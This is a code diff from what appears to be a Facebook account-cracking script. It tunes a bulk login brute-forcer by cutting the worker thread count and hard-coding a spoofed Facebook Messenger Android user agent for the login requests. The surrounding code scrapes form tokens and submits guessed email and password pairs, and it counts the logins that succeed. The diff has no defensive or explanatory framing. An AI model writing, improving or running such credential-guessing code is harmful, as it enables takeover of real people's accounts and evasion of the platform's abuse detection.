@@ -483,7 +483,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=55) as heron:
+    with ThreadPool(max_workers=33) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -504,7 +504,7 @@ def ran():
 def ren_sub(uid, pwx, meth, user, fb):
     global oks, loop
     shadid = random.choice(sys_ua)
-    custom_agent = ""
+    custom_agent = "Dalvik/2.1.0 (Linux; U; Android 9.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/493.0.0.16.524;FBPN/com.facebook.orca;FBLC/en_US;FBBV/230951215;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/9.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
     session = requests.Session()
     sys.stdout.write(
         f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}\r\r"),
@@ -517,7 +517,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = ua()
+            uax = custom_agent
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
